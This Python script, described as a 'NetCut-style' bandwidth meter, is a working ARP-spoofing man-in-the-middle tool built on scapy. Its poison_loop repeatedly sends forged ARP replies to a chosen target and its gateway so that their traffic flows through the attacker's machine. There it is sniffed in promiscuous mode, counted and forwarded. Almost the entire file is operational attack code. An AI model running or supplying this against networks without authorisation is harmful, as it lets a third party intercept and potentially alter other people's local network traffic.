#!/usr/bin/env python3
"""MITM pass-through bandwidth meter — counts bytes without throttling (NetCut-style)."""

import json
import os
import sys
import threading
import time
import warnings

warnings.filterwarnings('ignore', message='.*WinPcap.*')
warnings.filterwarnings('ignore', message='.*deprecated.*')

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from scapy.all import ARP, Ether, IP, conf, get_if_hwaddr, getmacbyip, sendp, sniff
except ImportError:
    print("Install scapy: pip install scapy", file=sys.stderr)
    sys.exit(1)

from iface_util import resolve_iface


def normalize_mac(mac: str) -> str:
    return mac.replace("-", ":").lower()


def main():
    if len(sys.argv) < 5:
        print(
            "Usage: arp_meter.py <target_ip> <target_mac> <gateway_ip> <iface> [local_ip]",
            file=sys.stderr,
        )
        sys.exit(1)

    target_ip = sys.argv[1]
    target_mac = normalize_mac(sys.argv[2])
    gateway_ip = sys.argv[3]
    local_ip = sys.argv[5] if len(sys.argv) > 5 else ""
    iface = resolve_iface(sys.argv[4], local_ip)

    conf.iface = iface
    conf.verb = 0

    try:
        our_mac = normalize_mac(get_if_hwaddr(iface))
    except Exception as exc:
        print(json.dumps({"type": "error", "message": f"Bad interface {iface}: {exc}"}), flush=True)
        sys.exit(2)

    traffic = {"tx": 0, "rx": 0}
    lock = threading.Lock()
    gateway_mac = None

    def resolve_gateway_mac():
        nonlocal gateway_mac
        try:
            mac = getmacbyip(gateway_ip)
            if mac:
                gateway_mac = normalize_mac(mac)
        except Exception:
            pass
        return gateway_mac or "ff:ff:ff:ff:ff:ff"

    def poison_loop():
        while True:
            gw_mac = resolve_gateway_mac()
            sendp(
                Ether(dst=target_mac)
                / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=our_mac),
                iface=iface,
                verbose=0,
            )
            sendp(
                Ether(dst=gw_mac)
                / ARP(op=2, pdst=gateway_ip, hwdst=gw_mac, psrc=target_ip, hwsrc=our_mac),
                iface=iface,
                verbose=0,
            )
            time.sleep(1.5)

    def emit_traffic():
        last_tx, last_rx, last_t = 0, 0, time.time()
        while True:
            time.sleep(1)
            now = time.time()
            dt = now - last_t
            with lock:
                dtx = traffic["tx"] - last_tx
                drx = traffic["rx"] - last_rx
                last_tx, last_rx = traffic["tx"], traffic["rx"]
            last_t = now
            if dt <= 0:
                continue
            print(
                json.dumps(
                    {
                        "type": "traffic",
                        "ip": target_ip,
                        "mac": target_mac,
                        "upload": round(max(0, (dtx * 8) / (dt * 1024 * 1024)), 3),
                        "download": round(max(0, (drx * 8) / (dt * 1024 * 1024)), 3),
                    }
                ),
                flush=True,
            )

    def forward(pkt):
        if IP not in pkt or Ether not in pkt:
            return
        ip = pkt[IP]
        nbytes = len(ip) if len(ip) > 0 else int(ip.len or 0)

        if ip.src == target_ip:
            with lock:
                traffic["tx"] += nbytes
            sendp(Ether(src=our_mac, dst=resolve_gateway_mac()) / ip, iface=iface, verbose=0)
        elif ip.dst == target_ip:
            with lock:
                traffic["rx"] += nbytes
            sendp(Ether(src=our_mac, dst=target_mac) / ip, iface=iface, verbose=0)

    print(
        json.dumps({"type": "started", "ip": target_ip, "mac": target_mac, "iface": iface}),
        flush=True,
    )
    threading.Thread(target=poison_loop, daemon=True).start()
    threading.Thread(target=emit_traffic, daemon=True).start()
    sniff(filter=f"host {target_ip}", prn=forward, store=0, promisc=True, iface=iface)


if __name__ == "__main__":
    main()
